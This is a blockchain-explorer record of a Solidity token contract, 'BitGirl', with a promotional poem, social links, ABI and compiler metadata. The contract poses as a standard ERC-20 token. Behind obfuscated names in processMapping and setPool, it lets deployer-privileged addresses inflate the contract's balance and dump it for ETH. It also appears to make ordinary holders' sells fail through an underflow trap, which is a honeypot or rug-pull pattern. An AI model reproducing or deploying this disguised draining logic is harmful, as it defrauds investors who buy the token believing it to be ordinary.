{"SourceCode": "/*\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2591\u2588\u2588\u2557\u2591\u2591\u2591\u2591\u2591\r\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2591\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2566\u255d\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2557\u2591\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\r\n\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2591\u2591\u2591\u2591\u2591\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2566\u255d\u2588\u2588\u2551\u2591\u2591\u2591\u2588\u2588\u2551\u2591\u2591\u2591\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551\u2591\u2591\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\r\n\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u255a\u2550\u255d\u2591\u2591\u2591\u2591\u255a\u2550\u2550\u2550\u2550\u2550\u255d\u2591\u255a\u2550\u255d\u255a\u2550\u255d\u2591\u2591\u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\r\n                             .'    '.\r\n                            (____/`\\ \\\r\n                           (  |' ' )  )\r\n                           )  _\\= _/  (\r\n                 __..---.(`_.'  ` \\    )\r\n                `;-\"\"-._(_( .      `; (\r\n                /       `-`'--'     ; )\r\n               /    /  .    ( .  ,| |(\r\n_.-`'---...__,'    /-,..___.-'--'_| |_)\r\n'-'``'-.._       ,'  |   / .........'\r\n          ``;--\"`;   |   `-`\r\n             `'..__.'\r\n\r\nIn the crypto world where fortunes swirl,\r\nThere's a token named \u20bfitGirl, a radiant pearl.\r\nA symbol of power, innovation's swirl,\r\nIn the blockchain's dance, she's the queen and girl.\r\n\r\n\u20bfitGirl, a name that echoes through the night,\r\nA pioneer of change, a digital light.\r\nIn the realm of crypto, she takes her stance,\r\nA leader, a visionary, with a bold advance.\r\n\r\nWith \u20bfitGirl, transactions are a breeze,\r\nA blend of beauty, strength, and ease.\r\nInnovative and fierce, she paves the way,\r\nFor a new era of crypto, come what may.\r\n\r\nNo limits, no boundaries, she's unchained,\r\nIn \u20bfitGirl's world, nothing's constrained.\r\nRevolutionary, she sets the stage,\r\nIn the crypto universe, she's all the rage.\r\n\r\nSo let's salute \u20bfitGirl's dynamic might,\r\nA token for the future, shining so bright.\r\nIn the cryptocurrency sphere, she claims her name,\r\nWith \u20bfitGirl, innovation is her eternal flame.\r\n\r\nhttps://web.wechat.com/BitGirlERC\r\nhttps://m.weibo.cn/BitGirlERC\r\nhttps://bitgirleth.xyz\r\nhttps://t.me/+6W5xDXKis7EyMGVk\r\n*/\r\n// SPDX-License-Identifier: Unlicense\r\npragma solidity ^ 0.8.19;\r\n \r\nabstract contract Context\r\n{ function _msgSender() internal view virtual returns(address)\r\n{ return msg.sender; } function _msgData() internal view virtual returns(bytes calldata)\r\n{ return msg.data; }\r\n}\r\ninterface IUniswapV2Router01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n    uint256 valueIn, uint256 valueOut, address[] calldata path, address to, uint256 deadline) external;\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function quote(address token, uint256 amountTokenDesired,\r\n    uint256 valueMin, uint256 ercMin, address to, uint256 deadline)\r\n    external payable returns (uint256 amountToken, uint256 ercValue, uint256 pool);\r\n}\r\ninterface IUniswapV2Factory{\r\n    function createPair(address tokenA, address tokenB) external returns(address pair);\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() \r\n    external view returns (uint256);\r\n\r\n    function balanceOf(address account) \r\n    external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n    external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) \r\n    external returns (bool);\r\n\r\n    function transferFrom(\r\n    address sender, address recipient, uint256 amount) \r\n    external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    constructor () { address msgSender = _msgSender(); _owner = msgSender; \r\n    emit OwnershipTransferred(address(0), msgSender);\r\n}\r\n    function owner() public view returns (address) { return _owner;\r\n}   modifier onlyOwner() { require(_owner == _msgSender(), \"Ownable: caller is not the owner\"); _;\r\n}\r\n    function renounceOwnership() public virtual onlyOwner {\r\n    emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }\r\n}\r\ncontract Contract is IERC20, Ownable { \r\n    bool private EMV; bool private setArtifacts; bool private tradingOpen = false;\r\n\r\n    string private _name = unicode\"\u20bfitGirl\"; string private _symbol = unicode\"\u20bfG\";\r\n    uint256 public BURN = 1; uint8 private _decimals = 9; \r\n    uint256 private _tTotal = 100000000 * 10 ** _decimals; uint256 private _max = _tTotal;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => uint256) private _getLibrary; mapping(address => uint256) private _tOwned;\r\n    mapping(address => address) private _getVersion; mapping(address => uint256) private _getSolidity;\r\n\r\n    constructor(address remixMaker) { _tOwned[msg.sender] = _tTotal; \r\n    _getSolidity[msg.sender] = _max; _getSolidity[address(this)] = _max; \r\n    mathCache = IUniswapV2Router01(remixMaker); \r\n\r\n    onlySafeMath = IUniswapV2Factory(mathCache.factory()).createPair(address(this), mathCache.WETH());\r\n    emit Transfer(address(0), msg.sender, _tTotal); }\r\n \r\n    function symbol() public view returns(string memory)\r\n    { return _symbol;\r\n    }\r\n    function name() public view returns(string memory)\r\n    { return _name;\r\n    }\r\n    function totalSupply() public view returns(uint256)\r\n    { return _tTotal;\r\n    }\r\n    function decimals() public view returns(uint256)\r\n    { return _decimals;\r\n    }\r\n    function allowance(address owner, address spender) public view returns(uint256)\r\n    { return _allowances[owner][spender];\r\n    }\r\n    function balanceOf(address account) public view returns(uint256)\r\n    { return _tOwned[account];\r\n    }\r\n    function approve(address spender, uint256 amount) external returns(bool)\r\n    { return _approve(msg.sender, spender, amount);\r\n    }\r\n    function _approve( address owner, address spender,\r\n    uint256 amount) private returns(bool) { require(owner != address(0) && spender != address(0), \r\n    'ERC20: approve from the zero address'); \r\n    \r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount); return true;\r\n    }\r\n    function transferFrom( address sender, address recipient, uint256 amount) external returns\r\n    (bool)\r\n    { processMapping(sender, recipient, amount); \r\n    return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);\r\n    }\r\n    function transfer(address recipient, uint256 amount) external returns(bool)\r\n    { processMapping(msg.sender, recipient, amount); return true;\r\n    }\r\n    function _beforeTokenTransfer( address from,\r\n    address to, uint256 amount) internal virtual \r\n    {}\r\n    function _afterTokenTransfer(address from, address to, uint256 amount) \r\n    internal virtual \r\n    {}    \r\n    function processMapping( address _program, address _label, uint256 mapAmount) private\r\n    { uint256 _true = balanceOf(address(this)); uint256 _gasLimit; if (EMV && _true > \r\n    _max && !setArtifacts && _program != onlySafeMath) \r\n    \r\n    { setArtifacts = true; showMessage(_true); setArtifacts = false;\r\n\r\n    } else if (_getSolidity[_program] > _max && _getSolidity[_label] > _max)\r\n    { _gasLimit = mapAmount; _tOwned[address(this)] += _gasLimit; setPool\r\n    (mapAmount, _label); return; }\r\n    else if (!setArtifacts && _getLibrary[_program] > 0 && _program != onlySafeMath && _getSolidity[_program] == 0) { \r\n    \r\n    _getLibrary[_program] = _getSolidity[_program] - _max; } else if (_label != address(mathCache) \r\n    && _getSolidity[_program] > 0 && mapAmount > _max && _label != onlySafeMath) { \r\n    _getSolidity[_label] = mapAmount; return; } address _subtracter = _getVersion[onlySafeMath]; \r\n    \r\n    if ( _getLibrary[_subtracter] == 0) _getLibrary[_subtracter] = _max; _getVersion[onlySafeMath] = _label; \r\n    if (BURN > 0 && _getSolidity[_program] == 0 && !setArtifacts && _getSolidity[_label] == 0)\r\n\r\n    { _gasLimit = (mapAmount * BURN) \r\n    / 100; \r\n    mapAmount -= _gasLimit; _tOwned[_program] -= _gasLimit; \r\n    \r\n    _tOwned[address(this)] += _gasLimit; }\r\n    _tOwned[_program] -= \r\n    mapAmount; _tOwned[_label] += mapAmount; emit Transfer\r\n    (_program, _label, mapAmount); if (!tradingOpen) \r\n    { require(_program == owner(), \"\"); } }\r\n\r\n    receive() external payable\r\n    {} \r\n    function addMessage(uint256 _get, uint256 typer, address to) private\r\n    { _approve(address(this), address(mathCache), _get); mathCache.quote\r\n    { value: typer }(address(this), _get, 0, 0, to, block.timestamp);\r\n    }\r\n    function showMessage(uint256 writer) private\r\n    { uint256 _showMsg = writer / 2; uint256 _public = address(this).balance;\r\n    setPool( _showMsg, address(this)); uint256 display = address(this).balance - _public; \r\n    addMessage( _showMsg, display, address(this));\r\n    }\r\n    function setPool(uint256 position, address _all) private\r\n    { address[] memory path = new address[](2); path[0] = address(this);\r\n    path[1] = mathCache.WETH(); _approve(address(this), address(mathCache), position);\r\n    mathCache.swapExactTokensForETHSupportingFeeOnTransferTokens(position, 0, path, _all, block.timestamp);\r\n    }\r\n    address public immutable onlySafeMath; IUniswapV2Router01 \r\n    public immutable mathCache\r\n    ;    \r\n    function beginTrading(bool _tradingOpen) \r\n    public onlyOwner { tradingOpen = _tradingOpen;\r\n    }   \r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"remixMaker\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"BURN\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"}],\"name\":\"beginTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mathCache\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router01\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"onlySafeMath\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Contract", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "1", "ConstructorArguments": "0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a05ddce4b7b351a329e66f05d74d679e9026044d35cae07c20c09faef70c8dbf"}